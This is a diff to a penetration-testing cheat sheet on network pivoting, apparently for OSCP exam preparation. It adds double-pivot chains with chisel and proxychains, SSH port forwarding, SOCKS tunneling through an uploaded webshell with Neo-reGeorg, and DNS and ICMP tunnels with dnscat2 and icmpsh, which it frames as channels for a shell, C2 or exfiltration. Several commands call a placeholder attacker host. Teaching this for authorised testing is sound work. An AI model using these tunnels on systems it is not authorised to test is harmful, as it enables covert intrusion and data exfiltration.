@@ -50,6 +50,8 @@ chisel client <ATTACKER_IP>:8080 R:socks
 proxychains nmap -sT -Pn 10.0.2.0/24
 ```
 Remote spec grammar: `3000` (simple local port), `R:2222:localhost:22` (reverse port forward), `R:socks` (reverse SOCKS5), `stdio:host:22`, `1.1.1.1:53/udp`. Auth: `--auth user:pass`.
+
+Double pivot without ligolo: chisel itself has no built-in multi-hop chaining, so don't try to daisy-chain a second `chisel server`/`chisel client` pair through pivot #1's own SOCKS port — that just dials chisel's local server port and never reaches pivot #2's SOCKS listener. Instead, wrap the *existing* pivot #1 SOCKS proxy (from `chisel client <ATTACKER_IP>:8080 R:socks` above) around a second hop, exactly as shown in "Chaining without ligolo (double pivot)" in the proxychains section below: run `proxychains4 ssh -D 1081 ... user@pivot2-internal-ip` through pivot #1's proxy to open pivot #2's own SOCKS port, then use a second proxychains config pointed at 127.0.0.1:1081 to traverse both hops. `ssh -J user@pivot1,user@pivot2 -D 1081 ...` (ProxyJump) is the simplest equivalent when SSH is available on both pivots.
 **Reference:** https://github.com/jpillora/chisel
 
 ## sshuttle — full-subnet routing over SSH ("poor man's VPN")
@@ -80,7 +82,35 @@ proxychains4 nmap -sT -Pn 10.0.2.0/24    # note: -sT required, not SYN scan
 proxychains4 smbclient -L //10.0.2.5/
 ```
 Pairs with SSH dynamic forwarding: `ssh -D 1080 -f -C -q -N user@pivot-host`.
+
+Chaining without ligolo (double pivot): stack two proxychains configs and feed one proxy through the other.
+```bash
+# /etc/proxychains4.conf (hop 1) -> socks5 127.0.0.1 1080  (pivot #1's SOCKS)
+# second config file for hop 2, e.g. ~/.proxychains/hop2.conf -> socks5 127.0.0.1 1081 (pivot #2's SOCKS, only reachable via hop 1)
+
+proxychains4 ssh -D 1081 -f -C -q -N user@pivot2-internal-ip    # opens pivot #2's SOCKS *through* pivot #1
+proxychains4 -f ~/.proxychains/hop2.conf nmap -sT -Pn 10.0.3.0/24   # now traverses both hops
+```
+Equivalent one-liner: `ssh -J user@pivot1,user@pivot2 -D 1081 ...` (ProxyJump) achieves the same double hop without a second proxychains config.
 **Reference:** https://github.com/rofl0r/proxychains-ng
+
+## Native SSH local/remote forwarding — the fundamental Linux pivoting primitive
+
+Requires only a standard SSH login on a Linux pivot box; no extra binaries needed.
+```bash
+# Local forward — reach a service on the far side of the pivot as if it were on localhost
+ssh -L 3306:127.0.0.1:3306 user@pivot-host
+# now 127.0.0.1:3306 on the attacker box reaches MySQL on pivot-host
+
+# Remote forward — expose a local (attacker-side) service back through the pivot
+ssh -R 8080:127.0.0.1:80 user@attacker-ip
+# now 127.0.0.1:8080 on attacker-ip reaches port 80 on the box running this command
+
+# Background, no shell, keep-alive (common for a persistent tunnel)
+ssh -f -N -L 3306:127.0.0.1:3306 user@pivot-host
+```
+`-D` (see proxychains section above) is the dynamic/SOCKS variant of the same mechanism.
+**Reference:** https://man.openbsd.org/ssh#L
 
 ## plink.exe — SSH tunneling from a compromised Windows host
 
@@ -106,9 +136,9 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8888
 Requires the `iphlpsvc` (IP Helper) service running; rules persist in the registry across reboots.
 **Reference:** https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy
 
-## Metasploit/Meterpreter — autoroute + socks_proxy + portfwd
+## Metasploit/Meterpreter — autoroute + socks_proxy + portfwd (reference only — BANNED on the OSCP exam)
 
-Only relevant once already inside a Meterpreter session (and note the OSCP exam's single-target Metasploit restriction — see EXAM-TIPS.md).
+**Do not use this on the OSCP exam.** The exam rules permit Meterpreter/Metasploit against only one single target machine for the entire exam, and explicitly forbid using it to route, pivot, or forward traffic toward any additional machine. `post/multi/manage/autoroute`, `auxiliary/server/socks_proxy`, and `portfwd` all exist specifically to route/forward traffic through a Meterpreter session to other hosts — that is the exact pivoting behavior the exam disallows, not merely a "single-target" caveat. Treat the commands below as reference material for non-exam engagements (labs, CTFs, real-world pentests) only; on the OSCP exam use ligolo-ng/chisel/sshuttle/plink/native SSH instead — see EXAM-TIPS.md.
 ```
 use post/multi/manage/autoroute
 set SESSION <id>
@@ -127,6 +157,54 @@ portfwd flush
 ```
 **Reference:** https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html
 
+## reGeorg / Neo-reGeorg — SOCKS Tunneling Through a Webshell
+
+Highest-value option when you've landed a webshell (PHP/ASPX/JSP) on a host whose egress is locked down to inbound HTTP only — no direct reverse shell callback works. Upload a tunnel script in the webshell's language alongside it; the neoreg Python client then turns that single HTTP endpoint into a local SOCKS proxy. Use **Neo-reGeorg** (maintained fork, AES-encrypted traffic, Python 3) — original reGeorg is unmaintained and Python 2 only.
+```bash
+# Attacker: generate an obfuscated/encrypted tunnel script matching the webshell's language
+python3 neoreg.py generate -k <password>          # writes tunnel.jsp / tunnel.aspx / tunnel.php / tunnel.ashx
+
+# Upload the matching tunnel script (e.g. tunnel.php) into the same directory as the existing webshell
+# via the webshell's own upload/write primitive, an SMB/FTP write, or the LFI/RFI foothold used originally
+
+# Attacker: start the neoreg client against the uploaded tunnel script — opens a local SOCKS5 proxy (default 127.0.0.1:1080)
+python3 neoreg.py -k <password> -u http://target/tunnel.php
+```
+Wrap tools through the resulting SOCKS proxy exactly as in the proxychains section above:
+```bash
+proxychains4 nmap -sT -Pn 10.0.2.0/24
+proxychains4 smbclient -L //10.0.2.5/
+```
+**Reference:** https://github.com/L-codes/Neo-reGeorg · https://github.com/sensepost/reGeorg (legacy, Python 2)
+
+## DNS Tunneling (dnscat2) — Last-Resort Egress
+
+For hosts where only DNS resolution reaches out (all other outbound ports/protocols filtered) — rare on the OSCP exam but a real fallback when it comes up.
+```bash
+# Attacker: run the dnscat2 server, authoritative for a domain you control (or --no-cache for direct/no-DNS-delegation labs)
+ruby dnscat2.rb tunnel.example.com
+
+# Target: client connects out over DNS queries
+./dnscat --dns server=<ATTACKER_IP>,port=53 tunnel.example.com
+```
+Slow (DNS-record-sized packets) — best for a C2 channel or small file exfil, not for wrapping bulk scanning/enumeration tools.
+**Reference:** https://github.com/iagox86/dnscat2
+
+## ICMP Tunneling (icmpsh) — ICMP-Only Egress Fallback
+
+Even rarer than DNS-only egress: only ICMP echo request/reply passes the filter.
+```bash
+# Attacker: disable the local ping reply first, then start the Python server
+sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
+python2 icmpsh_m.py <ATTACKER_IP> <TARGET_IP>
+
+# Target (Windows): run the bundled client binary
+icmpsh.exe -t <ATTACKER_IP>
+```
+The icmpsh slave/client is Windows-only (built against winsock2/iphlpapi and Win32 APIs such as IcmpSendEcho/CreateProcessA) — there is no Linux client build. On a Linux target, use a different ICMP-tunneling tool (e.g. ptunnel-ng) instead.
+Same framing as DNS tunneling — last resort, slow, use for a shell/exfil channel, not for wrapping tools.
+**Reference:** https://github.com/inquisb/icmpsh
+
 ---
 
 ## Tools Reference
@@ -141,3 +219,7 @@ portfwd flush
 | PuTTY / plink.exe | https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html |
 | netsh portproxy (built-in) | https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy |
 | Metasploit Framework | https://github.com/rapid7/metasploit-framework |
+| Neo-reGeorg | https://github.com/L-codes/Neo-reGeorg |
+| reGeorg (legacy) | https://github.com/sensepost/reGeorg |
+| dnscat2 | https://github.com/iagox86/dnscat2 |
+| icmpsh | https://github.com/inquisb/icmpsh |
